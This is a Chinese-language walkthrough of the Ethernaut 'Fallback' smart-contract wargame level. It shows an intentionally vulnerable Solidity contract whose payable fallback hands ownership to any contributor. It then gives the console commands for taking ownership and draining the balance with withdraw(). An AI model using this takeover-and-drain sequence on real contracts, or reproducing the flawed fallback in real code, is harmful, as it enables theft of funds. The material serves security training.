## Fallback

来源于Ethernaut wargame

## 0x01 Source code

```javascript
pragma solidity ^0.4.18;

import 'zeppelin-solidity/contracts/ownership/Ownable.sol';

contract Fallback is Ownable {

  mapping(address => uint) public contributions;

  function Fallback() public {
    contributions[msg.sender] = 1000 * (1 ether);
  }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    owner.transfer(this.balance);
  }

  function() payable public {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}
```

## 0x02 Need2know

- fallback在智能合约里面是一个比较特殊的函数，它没有函数名，且仅在下面情况下执行：
  - Contract receives ether
  - Someone calls the function not in the contract
  - the parameter is incorrect
- 在源代码中，`function() payable public`就是一个fallback函数

## 0x03 Solution

首先题目给定的任务有两个：

- Claim ownership of the contract
- Reduce its balance to 0

首先看到`contribute()`函数，当`value`值小于0.001时就可以成为contributor

```javascript
await contract.contribute({value:toWei(0.0001)})
```

检查一下是否成为了contributor，可以使用源码自带的`getContribution()`

```javascript
await contract.getContribution().then(x => x.toNumber())
```

接下来发送ether来触发fallback，因为得到了contributor身份，并且发送的value为正值，可以获得owner身份：

```javascript
contract.send(1)
```

任务目标一达成，检查owner身份（可以使用player查看是否一致）：

```javascript
await contract.owner()
```

接下来就可以使用`withdraw()`达成第二个目标任务：

```javascript
contract.withdraw()
```



